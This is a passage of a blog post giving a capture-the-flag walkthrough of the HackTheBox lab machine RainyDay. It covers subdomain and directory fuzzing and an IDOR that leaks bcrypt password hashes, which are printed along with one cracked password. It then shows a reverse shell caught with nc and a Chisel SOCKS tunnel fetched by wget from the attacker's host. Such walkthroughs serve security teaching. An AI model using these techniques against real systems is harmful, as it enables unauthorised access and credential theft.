@@ -1,0 +1,1136 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: RainyDay</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-rainyday">htb-rainyday</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#subdomain">subdomain</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#container">container</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#idor">idor</a> <a class="post-tag" href="/tags#john">john</a> <a class="post-tag" href="/tags#chisel">chisel</a> <a class="post-tag" href="/tags#foxyproxy">foxyproxy</a> <a class="post-tag" href="/tags#socks">socks</a> <a class="post-tag" href="/tags#proxychains">proxychains</a> <a class="post-tag" href="/tags#api">api</a> <a class="post-tag" href="/tags#flask">flask</a> <a class="post-tag" href="/tags#flask-cookie">flask-cookie</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#python-requests">python-requests</a> <a class="post-tag" href="/tags#youtube">youtube</a> <a class="post-tag" href="/tags#flask-unsign">flask-unsign</a> <a class="post-tag" href="/tags#jail">jail</a> <a class="post-tag" href="/tags#python-use-after-free">python-use-after-free</a> <a class="post-tag" href="/tags#unicode">unicode</a> <a class="post-tag" href="/tags#emoji">emoji</a> <a class="post-tag" href="/tags#john-rules">john-rules</a> <a class="post-tag" href="/tags#htb-scanned">htb-scanned</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-02-18T14:45:00+00:00" itemprop="datePublished">Feb 18, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/02/18/htb-rainyday.html" style="color: #e6e6e6; text-decoration: none;">HTB: RainyDay</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/rainyday-cover.webp" type="image/webp"/>
+<img alt="RainyDay" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/rainyday-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>RainyDay is a different kind of machine from HackTheBox. It’s got a lot of enumerating and fuzzing to find next steps and a fair amount of programming required to solve. I’ll start by exploiting an IDOR vulnerability to leak hashes, cracking one and getting access to a website that manages containers. From inside a container, I can reach a dev instance and an API that effectively let’s me apply a given regex to a file on the filesystem, which I’ll turn into a file read exploit with some Python scripting. From there I can leak the flask secret key and get into another user’s account, where I’ll find a misconfiguration that allows me to escape the container’s jail and read the user’s private SSH key. From the host, I’ll first exploit Python itself to get execution as the next user. Then I’ll abuse unicode characters to slip more characters than allowed into a hashing program, and use that to brute force a secret salt, allowing me to crash the root hash. In Beyond Root, I’ll look at a mistake that allowed for skipping a large part of this box.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/502 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/rainyday" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">RainyDay</a> <a href="https://hackthebox.com/machines/rainyday" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-rainyday.webp" type="image/webp"/> <img alt="RainyDay" class="img-av" src="/icons/box-rainyday.png"/></picture></a><br/><a href="https://hackthebox.com/machines/rainyday" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1580574128939028481">15 Oct 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">18 Feb 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/rainyday-diff.webp" type="image/webp"/><img alt="Rated difficulty for RainyDay" src="/img/rainyday-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/rainyday-radar.webp" type="image/webp"/><img alt="Radar chart for RainyDay" src="/img/rainyday-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:48:31</span><a href="https://app.hackthebox.com/users/184611" rel="noopener" target="_blank"><img alt="Geiseric" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/184611" style="display: unset"/><span class="user-text" style="display: none"> Geiseric</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">05:11:34</span><a href="https://app.hackthebox.com/users/87804" rel="noopener" target="_blank"><img alt="jazzpizazz" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/87804" style="display: unset"/><span class="user-text" style="display: none"> jazzpizazz</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/52045" rel="noopener" target="_blank"><img alt="InfoSecJack" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/52045" style="display: unset"/><span class="user-text" style="display: none"> InfoSecJack</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.184
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-09 22:12 UTC
+Nmap scan report for 10.10.11.184
+Host is up (0.086s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.10.11.184
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-09 22:13 UTC
+Nmap scan report for 10.10.11.184
+Host is up (0.087s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://rainycloud.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.02 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Ubuntu 22.04 jammy.</p>
+<p>The webserver is returning a redirect to <code class="language-plaintext highlighter-rouge">http://rainycloud.htb</code>.</p>
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Given the use of DNS names on the website, I’ll fuzz for any potential subdomains that respond differently from the default case with <code class="language-plaintext highlighter-rouge">ffuf</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.10.11.184 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.rainycloud.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">--fs</span> 229
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.184
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.rainycloud.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 229
+________________________________________________
+
+dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 110ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 443 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>I’m filtering for responses that are of length 229, and there’s only one that is different. I’ll add both <code class="language-plaintext highlighter-rouge">rainycloud.htb</code> and <code class="language-plaintext highlighter-rouge">dev.rainycloud.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a cloud-based Docker container hosting service:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210115420693.webp" type="image/webp"/>
+<img alt="image-20230210115420693" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210115420693.png"/>
+</picture>
+<p>The jack user has a container named “secrets”, which seems like a good target at some point.</p>
+<p>The page mentions that a documented API is coming in the next release. The login page has a normal form a well as a link to a registration:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210115754725.webp" type="image/webp"/>
+<img alt="image-20230210115754725" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210115754725.png"/>
+</picture>
+<p>If I try to register, it returns that registration is currently closed:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210115840867.webp" type="image/webp"/>
+<img alt="image-20230210115840867" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210115840867.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>I’m not able to guess the programming language with by guessing at the index page. <code class="language-plaintext highlighter-rouge">index.html</code>, <code class="language-plaintext highlighter-rouge">index.php</code>, and <code class="language-plaintext highlighter-rouge">index</code> all come back 404 not found.</p>
+<p>The response headers don’t provide any additional insight:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 10 Feb 2023 17:00:42 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4378</span>
+</code></pre></div></div>
+<p>Based on the lack of use of file extensions, it’s fair to guess that the server is running Python or Ruby, but I don’t know for sure.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://rainycloud.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.7.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://rainycloud.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.7.1
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       63l      142w     3254c http://rainycloud.htb/login
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      110l      270w     4378c http://rainycloud.htb/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       68l      157w     3686c http://rainycloud.htb/register
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        5l       22w      189c http://rainycloud.htb/logout =&gt; </span><span class="feroxbuster-yellow">/</span><span class="go">
+</span><span class="feroxbuster-yellow">308</span><span class="go">      GET        5l       22w      239c http://rainycloud.htb/api =&gt; </span><span class="feroxbuster-yellow">http://rainycloud.htb/api/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        5l       22w      199c http://rainycloud.htb/new =&gt; </span><span class="feroxbuster-yellow">/login</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        1w       59c http://rainycloud.htb/api/list
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l        1w       29c http://rainycloud.htb/api/healthcheck
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 4m     90000/90000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:8       </span><span class="feroxbuster-red">errors</span><span class="go">:1      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 4m     30000/30000   113/s   http://rainycloud.htb 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 4m     30000/30000   112/s   http://rainycloud.htb/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 4m     30000/30000   112/s   http://rainycloud.htb/api 
+
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/api</code> is interesting.</p>
+<h4 id="api">/api</h4>
+<p>This page lists the various in development API endpoints for the service:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210122157558.webp" type="image/webp"/>
+<img alt="image-20230210122157558" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210122157558.png"/>
+</picture>
+<p>Each of these returns limited information:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/list
+<span class="go">{"secrets":{"image":"alpine-python:latest","user":"jack"}}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/healthcheck
+<span class="go">{"result":true,"results":[]}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/user/1
+<span class="go">{"Error":"Not allowed to view other users info!"}
+</span></code></pre></div></div>
+<p>It says that <code class="language-plaintext highlighter-rouge">healthcheck</code> is only availably internally, so it’s not surprising that it returns nothing here. Similarly, the error on <code class="language-plaintext highlighter-rouge">user/1</code> seems expected since I am not authenticated in any way. Interestingly, for user id 4, <code class="language-plaintext highlighter-rouge">/api/user</code> returns something different:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/user/4
+<span class="go">{}
+</span></code></pre></div></div>
+<h4 id="fuzz-users">Fuzz Users</h4>
+<p>My theory is that user 1 exists and that 4 does not. I can fuzz this to look for any other users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-w</span> &lt;<span class="o">(</span> <span class="nb">seq </span>1 1000 <span class="o">)</span> <span class="nt">-u</span> http://rainycloud.htb/api/user/FUZZ <span class="nt">-fs</span> 3
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://rainycloud.htb/api/user/FUZZ
+ :: Wordlist         : FUZZ: /dev/fd/63
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3
+________________________________________________
+
+3                       [Status: 200, Size: 50, Words: 7, Lines: 2, Duration: 104ms]
+1                       [Status: 200, Size: 50, Words: 7, Lines: 2, Duration: 188ms]
+2                       [Status: 200, Size: 50, Words: 7, Lines: 2, Duration: 227ms]
+:: Progress: [1000/1000] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Since <code class="language-plaintext highlighter-rouge">ffuf</code> doesn’t have the range capability that <code class="language-plaintext highlighter-rouge">wfuzz</code> does, I’m using the <code class="language-plaintext highlighter-rouge">&lt;( )</code> Bash syntax to run the <code class="language-plaintext highlighter-rouge">seq</code> command and have the output be treated as if it’s being read from a file.</p>
+<p>Only 1, 2, and 3 seem to exist, but I still can’t access data on any of them.</p>
+<h3 id="devrainycloudhtb">dev.rainycloud.htb</h3>
+<p>Visiting this site just returns a 403 Forbidden:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">403</span> <span class="ne">FORBIDDEN</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 10 Feb 2023 17:11:08 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">26</span>
+
+Access Denied - Invalid IP
+</code></pre></div></div>
+<p>I’ll keep an eye out for a way to access it from RainyDay itself.</p>
+<h2 id="shell-in-container">Shell in Container</h2>
+<h3 id="site-auth-as-gary">Site Auth as gary</h3>
+<h4 id="idor">IDOR</h4>
+<p>Typically people think of insecure direct object reference (IDOR) vulnerabilities as changing the user ID from 1 to 2 and getting back data that I’m not supposed to get. But there are other ways that an IDOR can expose data. Some poking around at the API shows that while <code class="language-plaintext highlighter-rouge">/api/user/1</code> returns an error, <code class="language-plaintext highlighter-rouge">/api/user/1.0</code> does not!:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/user/1.0
+<span class="go">{"id":1,"password":"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O","username":"jack"}
+</span></code></pre></div></div>
+<p>I’ll explore what’s going on here in <a href="#beyond-root">Beyond Root</a>. I’ll grab the other two:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/user/2.0
+<span class="go">{"id":2,"password":"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W","username":"root"}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://rainycloud.htb/api/user/3.0
+<span class="go">{"id":3,"password":"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG","username":"gary"}
+</span></code></pre></div></div>
+<p>I’ll also confirm that no other users show up this way with <code class="language-plaintext highlighter-rouge">ffuf</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-w</span> &lt;<span class="o">(</span> <span class="nb">seq </span>1 1000 <span class="o">)</span> <span class="nt">-u</span> http://rainycloud.htb/api/user/FUZZ.0 <span class="nt">-fs</span> 3
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://rainycloud.htb/api/user/FUZZ.0
+ :: Wordlist         : FUZZ: /dev/fd/63
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3
+________________________________________________
+
+1                       [Status: 200, Size: 101, Words: 1, Lines: 2, Duration: 96ms]
+2                       [Status: 200, Size: 101, Words: 1, Lines: 2, Duration: 171ms]
+3                       [Status: 200, Size: 101, Words: 1, Lines: 2, Duration: 203ms]
+:: Progress: [1000/1000] :: Job [1/1] :: 364 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+</span></code></pre></div></div>
+<h4 id="crack-hashes">Crack Hashes</h4>
+<p>I’ll save the hashes into a file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jack:$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O
+root:$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W
+gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG
+</code></pre></div></div>
+<p>Feeding these into <code class="language-plaintext highlighter-rouge">john</code> along with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, it cracks one of the passwords in about four minutes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>john hashes <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<span class="go">Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
+Loaded hashes with cost 1 (iteration count) varying from 32 to 4096
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+rubberducky      (gary) 
+...[snip]...
+</span></code></pre></div></div>
+<p>None of the others broke and after a few minutes, I’ll kill it and move on.</p>
+<p>Back at the web page, I’m able to log in as gary.</p>
+<h3 id="access-container">Access Container</h3>
+<h4 id="enumeration">Enumeration</h4>
+<p>Authenticated, I have access to <code class="language-plaintext highlighter-rouge">/containers</code> which talks about how to create a container, and shows gray has no containers running currently:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210152332874.webp" type="image/webp"/>
+<img alt="image-20230210152332874" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210152332874.png"/>
+</picture>
+<p>Clicking “New Container” asks for a name and an image:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210152409586.webp" type="image/webp"/>
+<img alt="image-20230210152409586" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210152409586.png"/>
+</picture>
+<p>Now it shows up at the bottom of the containers page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210152438899.webp" type="image/webp"/>
+<img alt="image-20230210152438899" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210152438899.png"/>
+</picture>
+<p>On clicking “Execute Command”, the site returns <code class="language-plaintext highlighter-rouge">command_output.txt</code>. For example, on giving it “id”, it returns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1337 gid=1337
+</code></pre></div></div>
+<p>That’s an odd <code class="language-plaintext highlighter-rouge">id</code> output. <code class="language-plaintext highlighter-rouge">whoami</code> returns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami: unknown uid 1337
+</code></pre></div></div>
+<p>It seems I’m running as an unknown user.</p>
+<p>“Execute Command (background)” doesn’t return anything, and the button stays disabled until I refresh the page.</p>
+<p>Trying to run <code class="language-plaintext highlighter-rouge">ping</code> returns an error that it can’t run without root:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PING 10.10.14.6 (10.10.14.6): 56 data bytes
+ping: permission denied (are you root?)
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">curl</code> isn’t on the box, but <code class="language-plaintext highlighter-rouge">wget</code> is. When I send <code class="language-plaintext highlighter-rouge">wget 10.10.14.6</code>, there’s a request at my Python webserver, and then the response says:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connecting to 10.10.14.6 (10.10.14.6:80)
+wget: can't open 'index.html': Permission denied
+</code></pre></div></div>
+<p>That implies that the current user doesn’t have write permissions in the current directory. I’ll try changing the output to different directories, but it always fails. Interestingly, if I try to save it as a name without an extension, it does work:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connecting to 10.10.14.6 (10.10.14.6:80)
+saving to '/tmp/index'
+index                100% |********************************|   532  0:00:00 ETA
+'/tmp/index' saved
+</code></pre></div></div>
+<h4 id="shell">Shell</h4>
+<p>I can get a shell in the container. I used the <code class="language-plaintext highlighter-rouge">alpine-python:latest</code> container, which means there is Python. <code class="language-plaintext highlighter-rouge">python</code> isn’t in the path, but <code class="language-plaintext highlighter-rouge">python3</code> is. I’ll generate a “Python3 #2” reverse shell from <a href="https://www.revshells.com/">revshells.com</a>, and run it as as a background command. It connects back, with some odd chacters but otherwise working fine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">oxdf@hacky$ nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.184 41814
+</span><span class="gp">/ $ ^[[49;5R</span><span class="nb">pwd</span>
+<span class="go">/
+</span><span class="gp">/ $ ^[[49;5R</span><span class="nb">ls</span>
+<span class="go">bin      home     media    proc     sbin     tmp
+dev      lib      mnt      root     srv      usr
+etc      logfile  opt      run      sys      var
+console?prompt=/%20$%20^[[49;5R
+</span></code></pre></div></div>
+<p>The container is basically empty, which isn’t surprising, as it’s a container I just created. That said, there is a misconfiguration in how this container runs background commands that would let me skip several of the next steps, which I’ll cover in <a href="#beyond-root">Beyond Root</a>.</p>
+<h2 id="shell-as-jack">Shell as jack</h2>
+<h3 id="access-to-dev">Access to dev</h3>
+<h4 id="create-socks-proxy">Create Socks Proxy</h4>
+<p>I’ll give my container commands to upload <a href="https://github.com/jpillora/chisel">Chisel</a> in to the container, first with <code class="language-plaintext highlighter-rouge">wget http://10.10.14.6/chisel_1.8.1_linux_amd64 -O /tmp/c</code>, and then with <code class="language-plaintext highlighter-rouge">chmod +x /tmp/c</code>.  An empty return on the second command indicates success. I’ll start up my server (<code class="language-plaintext highlighter-rouge">./chisel_1.8.1_linux_amd64 server -p 8000 --reverse</code>, using a different port since Burp already listens on the default port, 8080), and the connect back with a background command (since I want it to be long running) of <code class="language-plaintext highlighter-rouge">/tmp/c client 10.10.14.6:8000 R:socks</code>. The background commands don’t return anything, but there’s a connection at my Chisel server:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/02/10 21:46:43 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
+</code></pre></div></div>
+<h4 id="configure-traffic">Configure Traffic</h4>
+<p>I use FoxyProxy to manage how my traffic proxies out of Firefox in my hacking VM. Most of the time, I leave it in “Use Enabled Proxies By Pattern and Order” mode, and I’ve got patterns to send most HTB and CTF traffic through Burp (see <a href="https://www.youtube.com/watch?v=iTm33Miymdg">this video where I set that up</a>).</p>
+<p>I’ve also got a profile in FoxyProxy I call Local SOCKS 1080:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230210170109823.webp" type="image/webp"/>
+<img alt="image-20230210170109823" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230210170109823.png"/>
+</picture>
